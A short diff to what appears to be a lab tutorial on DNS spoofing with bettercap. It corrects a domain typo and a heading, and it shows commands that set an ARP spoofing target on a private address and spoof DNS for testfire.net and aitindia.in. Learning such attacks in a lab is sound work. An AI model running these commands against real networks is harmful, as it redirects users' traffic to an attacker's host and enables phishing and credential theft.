@@ -19,13 +19,13 @@ set arp.spoof.targets 192.168.229.132
 
 --------------
 
-## Step 2 : Starting dns spoofing (Start bettercap tool and perform)
+## Step 2 : Starting dns spoofing 
 
 
 ```
 set dns.spoof.address 192.168.229.131
 
-set dns.spoof.domains testfire.ne,aitindia.in
+set dns.spoof.domains testfire.net,aitindia.in
 
 dns.spoof on
 ```
